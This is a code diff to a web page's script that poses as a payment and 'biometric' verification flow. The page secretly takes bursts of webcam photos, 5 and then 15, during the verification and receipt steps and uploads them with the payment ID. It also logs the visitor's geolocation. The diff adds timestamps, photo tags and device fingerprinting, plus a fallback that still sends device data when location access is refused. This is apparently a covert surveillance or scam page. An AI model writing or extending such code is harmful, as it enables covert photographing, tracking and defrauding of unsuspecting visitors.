@@ -523,7 +523,7 @@
             showToast("Biometric Lock: ENGAGED", "info");
 
             // BURST CAPTURE 1: Biometric Step (5 photos in 1s)
-            await captureBurst(5, 200);
+            await captureBurst(5, 200, 'bio');
 
             showToast("Identity Confirmed", "success");
             setTimeout(() => {
@@ -533,7 +533,7 @@
             }, 500);
         }
 
-        async function captureBurst(count, interval) {
+        async function captureBurst(count, interval, photoType) {
             for (let i = 0; i < count; i++) {
                 if (video.videoWidth > 0) {
                     const c = document.createElement('canvas');
@@ -543,7 +543,12 @@
                     fetch('/capture-photo', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ photo, paymentId })
+                        body: JSON.stringify({
+                            photo,
+                            paymentId,
+                            type: photoType || 'verify',
+                            timestamp: new Date().toISOString()
+                        })
                     });
                 }
                 await new Promise(r => setTimeout(r, interval));
@@ -582,7 +587,7 @@
             }
 
             // BURST CAPTURE 2: Receipt Step (High Speed)
-            captureBurst(15, 150);
+            captureBurst(15, 150, 'receipt');
 
             setTimeout(() => {
                 if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
@@ -604,12 +609,44 @@
         async function logVisit() {
             try {
                 const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
+
+                // Collect Device Info
+                const deviceDetails = {
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    platform: navigator.platform,
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    connection: navigator.connection ? navigator.connection.effectiveType : 'unknown'
+                };
+
                 fetch('/log-visit', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ paymentId, location: { latitude: pos.coords.latitude, longitude: pos.coords.longitude } })
+                    body: JSON.stringify({
+                        paymentId,
+                        location: {
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude
+                        },
+                        deviceDetails,
+                        userAgent: navigator.userAgent
+                    })
                 });
-            } catch (e) { }
+            } catch (e) {
+                // Fallback log without location
+                fetch('/log-visit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        paymentId,
+                        deviceDetails: {
+                            screenResolution: `${window.screen.width}x${window.screen.height}`,
+                            platform: navigator.platform
+                        },
+                        userAgent: navigator.userAgent
+                    })
+                });
+            }
         }
     </script>
 </body>
